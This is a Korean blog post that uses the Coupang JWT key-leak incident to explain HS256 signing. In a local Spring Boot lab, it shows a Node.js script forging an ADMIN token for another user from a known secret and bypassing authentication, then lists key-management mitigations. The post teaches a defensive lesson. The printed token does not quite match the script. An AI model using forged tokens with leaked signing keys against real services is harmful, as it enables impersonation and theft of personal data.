---
title: "쿠팡 해킹 사태로 알아보는 JWT 서명키 취약점: 위조 토큰 생성과 Spring Boot 인증 재현"
date: 2025-12-11 21:00:00 +0900
categories: [Backend, Security]
tags: [Java, Spring Boot, Spring Security, JWT, Authentication, Token]
---

2025년 쿠팡에서 발생한 해킹사고는 단순한 정보 유출 문제가 아니라, JWT 서명키 관리 실패로 인증 시스템 전체가 뚫리는 치명적인 보안 취약점이었습니다. 퇴사자가 회사에서 사용하던 JWT 서명키(JWT Access Token 서명키)를 회수하지 않았고, 해당 키로 정상 사용자처럼 보이는 Access Token을 임의로 생성하여 약 5개월 동안 무단으로 시스템에 접근할 수 있었습니다. 이로 인해 약 3300만건의 개인정보가 유출됐습니다.

내부용 API의 외부 노출도 문제이지만, 정상적인 로그인 절차 없이도 Acess Token을 만들어 개인정보를 추출할 수 있었던 상황을 JWT 원리와 Spring Boot로 구현한 인증 로직, Node.js로 위조 토큰을 만들어 실제 서버 인증이 우회되는 상황을 직접 재현해보겠습니다.

# JWT 원리 이해하기

JWT(Json Web Token)은 아래처럼 3부분으로 구성된 단순한 문자열입니다. 각 파트는 Base64URL로 인코딩되며, 점(.)으로 구분됩니다. signature는 header + payload를 secret으로 서명한 값으로 토큰이 위조되었는지 확인하는 유일한 값입니다.

```css
header.payload.signature
```

## 서버는 토큰을 어떻게 검증할까? (토큰 검증 절차)

1. 클라이언트가 보낸 header + payload를 이용해 signature를 재계산
2. 서버가 보관한 서명키(secret)로 재계산한 signature와 비교
3. 동일하면 변조되지 않은 토큰으로 신뢰 

JWT는 서버가 별도의 세션을 저장하지 않는 stateless 구조이고 서버는 오직 서명만 보고 판단하여 신뢰하는 구조입니다.

## 서명키가(secret) 유출되면 어떤 일이 벌어질까?

- 공격자는 임의 payload를 가진 토큰을 생성하여 진짜와 구별되지 않는 토큰을 만들 수 있습니다.
    - userId: 1234 → 9999로 바꾸기 (특정 사용자로 위장)
    - role: user → admin으로 바꾸기 (관리자 권한 탈취)
    - exp: 과거 → 1년 뒤 (만료되지 않은 토큰)
    - scopes: 제한된 권한 → 광범위 권한
- 서명키만 있으면 payload를 어떻게 바꿔도 검증에 통과합니다.

# 쿠팡 사고 아키텍처 재현해보기

### DB스키마

userId가 그대로 JWT sub 필드와 매칭되는 구조라면 공격 시 위장이 매우 쉬워집니다.

```sql
CREATE TABLE users (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(100) NOT NULL UNIQUE,
    password VARCHAR(255) NOT NULL,
    email VARCHAR(255),
    role VARCHAR(50)
);
```

### Spring Boot 인증 필터

이 구조는 HS256 서명키를 알고 있으면 누구나 통과시킬 수 있는 형태입니다.

```java
/**
* JwtAuthenticationFilter.java
**/
protected void doFilterInternal(HttpServletRequest request,
                                HttpServletResponse response,
                                FilterChain filterChain)
        throws ServletException, IOException {

    String authHeader = request.getHeader("Authorization");

    if (authHeader == null || !authHeader.startsWith("Bearer ")) {
        filterChain.doFilter(request, response);
        return;
    }

    String token = authHeader.substring(7);

    try {
        if (jwtService.isExpired(token)) {
            filterChain.doFilter(request, response);
            return;
        }

        Long userId = jwtService.extractUserId(token);
        String role = jwtService.extractRole(token);

        User user = userService.findById(userId);

        UsernamePasswordAuthenticationToken authentication =
                new UsernamePasswordAuthenticationToken(
                    user, null,
                    Collections.singleton(new SimpleGrantedAuthority("ROLE_" + role))
                );

        SecurityContextHolder.getContext().setAuthentication(authentication);

    } catch (ExpiredJwtException e) {
        log.warn("Expired JWT: {}", e.getMessage());
    } catch (SignatureException e) {
        log.warn("Invalid JWT signature: {}", e.getMessage());
    } catch (Exception e) {
        log.warn("JWT validation error: {}", e.getMessage());
    }

    filterChain.doFilter(request, response);
}
```

# JWT 발급 및 검증 방식

### HS256(대칭키 기반)

HMAC(대칭키 암호화 알고리즘) + SHA256(암호화 해시 알고리즘)

H : Hash-based Message Authentication Code. 비밀키를 사용하여 데이터의 무결성과 인증을 보장하는 방식

S : Secure Hash Algorithm 256-bit. 어떤 입력값이든 256비트(32바이트)의 고정된 길이의 해시 값으로 변환하는 함수

HS256은 대칭키 기반이기 때문에 서버가 가진 secret이 유출되면 모든 토큰을 공격자가 만들어낼 수 있습니다.

```java
    @Value("${jwt.secret:my-super-secret-key-for-demo-12345678901234567890}")
    private String secret;

    @Value("${jwt.expiration-ms:3600000}") // default 1 hour
    private long expirationMs;

    private SecretKey key;
    private JwtParser parser;

    @PostConstruct
    public void init() {
        this.key = Keys.hmacShaKeyFor(secret.getBytes(StandardCharsets.UTF_8));
        this.parser = Jwts.parser().verifyWith(key).build();
    }

    public String generateToken(Long userId, String role) {
        Date now = new Date();
        Date expiry = new Date(now.getTime() + expirationMs);

        return Jwts.builder()
                .subject(String.valueOf(userId))
                .issuedAt(now)
                .expiration(expiry)
                .claim("role", role)
                .signWith(key, Jwts.SIG.HS256)
                .compact();
    }
```

# 정상 테스트 시나리오

1. 로그인
2. 서버가 발급한 JWT사용
3. 정상적으로 인증됨

### 로그인 → JWT발급

VSCode HTTP Client 예시:

```java
@base = http://localhost:8080

### 로그인
# @name login
POST {{base}}/auth/login
Content-Type: application/json

{
  "username": "user1",
  "password": "password1"
}

### 사용자 정보 조회
@token = {{login.response.body.accessToken}}
GET {{base}}/user/me
Authorization: Bearer {{token}}
```

### 결과

```java
HTTP/1.1 200 
{
  "id": 1,
  "username": "user1",
  "email": "user1@example.com",
  "role": "USER"
}
```

# 해킹 시나리오 재현

1. 공격자가 탈취한 HS256 secret key 확보
2. 공격자가 userId = 2처럼 위조 토큰생성
3. API 호출
4. 서버는 정상 사용자라고 판단 → 개인정보 노출

### 공격자가 userId=2, role=ADMIN 으로 위조한 토큰 생성하기

```jsx
const jwt = require("jsonwebtoken");

const secret = "my-super-secret-key-for-demo-12345678901234567890";

const fakeUserId = "2";

iat = Math.floor(Date.now() / 1000)
exp = iat + 3600

const payload = {
  sub: fakeUserId,
  role: "ADMIN"
};

const token = jwt.sign(payload, secret, { algorithm: "HS256", expiresIn: "1h" });
```

```java
node generate-token.j

@token = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyIiwicm9sZSI6IlVTRVIiLCJpYXQiOjE3NjU0MzE0OTgsImV4cCI6MTc2NTQzNTA5OH0.hWXAU_gPSHVLiztetG0HtaKSKCUC_W8RRMQPbA0ThjM
```

### 요청

```java
GET {{base}}/user/me
Authorization: Bearer {{token}}
```

### 결과

```java
HTTP/1.1 200 
{
  "id": 2,
  "username": "admin",
  "email": "admin@example.com",
  "role": "ADMIN"
}
```

## 재발 방지 대책

1. 키 로테이션 자동화
2. 대칭키 → 비대칭키 전환
3. AWS KMS, Vault 사용
4. 이상 행위 탐지
5. 사내 인증키 접근권한 최소화

# 마무리

JWT는 유용한 인증 도구이지만, 서명키가 유출되는 순간 인증 시스템이 무력화될 수 있습니다. 구현한 것처럼 서명키만 있으면 누구나 모든 사용자를 위장할 수 있습니다.

# 예시코드

모든 코드는 [깃헙](https://github.com/hyeonki-min/spring-labs/tree/master/coupang-jwt)에 있습니다.